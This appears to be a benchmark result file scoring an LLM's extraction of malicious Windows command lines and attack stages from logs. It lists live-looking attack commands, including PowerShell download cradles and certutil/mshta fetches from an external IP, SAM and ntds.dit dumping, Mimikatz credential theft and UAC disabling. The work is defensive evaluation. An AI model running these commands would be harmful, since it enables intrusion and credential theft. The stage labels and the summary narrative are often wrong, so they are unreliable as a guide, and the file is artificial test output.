@@ -1,0 +1,388 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\fhwdixby\\fhwdixby.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Collection"
+      },
+      {
+        "command": "schtasks  /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wmic computersystem get domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "schtasks  /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks  /delete /tn test /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "Cmd.exe /C spolsv.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C echo test >> test.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1003.003",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe save hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Collection"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=c:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mklink /D C:\\windows\\temp\\vssstore \\?\\globalroot\\device\\harddiskvolume-shadowcopy1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "wmic shadowcopy call create volume=c:\\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wmic /node=localhost shadowcopy call create volume=c:\\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Collection"
+      },
+      {
+        "command": "gwmI -List win32_shadowcopy).Create('c:\\', 'ClientAccessible')",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Start-Process '\\?\\C:\\Windows\\System32\\MMC.exe'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Value 'cmd.exe /c notepad.exe'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "eventvwr.msc",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "eventvwr.msc",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/T1218.005.hta C:\\tmp\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "ping -t 127.0.0.1; dnslookup _gateway._tcp.localdomain || ping -t ::1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "rpcdump",
+        "stage": "Discovery"
+      },
+      {
+        "command": "getuid",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "ipconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "route print -4",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sc\\\\query type=service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "doskey /history",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic process list",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C powercfg /BatteryReportFile",
+        "stage": "Discovery"
+      },
+      {
+        "command": "SystemInfo",
+        "stage": "Collection"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest -Uri http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name '\"(default)'\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method '",
+        "stage": "Collection"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C del /f /q b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=2020-10-10 12:12:12",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C rm /s /q timestomp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C rundll32 user32.dll,LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C net localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C nltest /domain_trusts",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest -Uri http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C \"netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /C tor.lnk",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"start-process c:\\\\\\\\path\\\\\\\to\\\\exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-mimikatz -DumpCreds",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C `invoke-psimage -out evil-kiwi.png -image 995647.jpg -script $(resolve-path .\\Invoke-Mimikatz.ps1)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C import-module .\\Invoke-PSImage.ps1;invoke-psimage -out evil-kiwi.png -image 995647.jpg -script $(resolve-path .\\Invoke-Mimikatz.ps1)",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-MIMIKATZ -DumpCreds",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-Mimikatz -DumpCreds",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-mimikatz -DumpCreds",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers exploited multiple entry points for establishing initial access vectors via various means including web shells, exploiting vulnerabilities in Microsoft applications, and leveraging Python to download dependencies. Once inside, they engaged in activities aimed at persistence, command and control, privileged elevation and resource discovery. Further attacks involved malicious DLL creation and deployment for potential future use and DNS spoofing attempts to hijack legitimate traffic.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86035,
+      "completion_tokens": 8417,
+      "total_tokens": 94452,
+      "wall_clock_s": 117.137,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.6818181818181818,
+      "f1": 0.46875000000000006,
+      "tp": 30,
+      "fp": 54,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.11904761904761904,
+      "recall": 0.2631578947368421,
+      "f1": 0.1639344262295082,
+      "tp": 10,
+      "fp": 74,
+      "fn": 28,
+      "recall_partial": 0.43243243243243246
+    },
+    "hallucination_rate": 0.05405405405405406,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86035,
+      "completion_tokens": 8417,
+      "total_tokens": 94452,
+      "wall_clock_s": 117.137,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
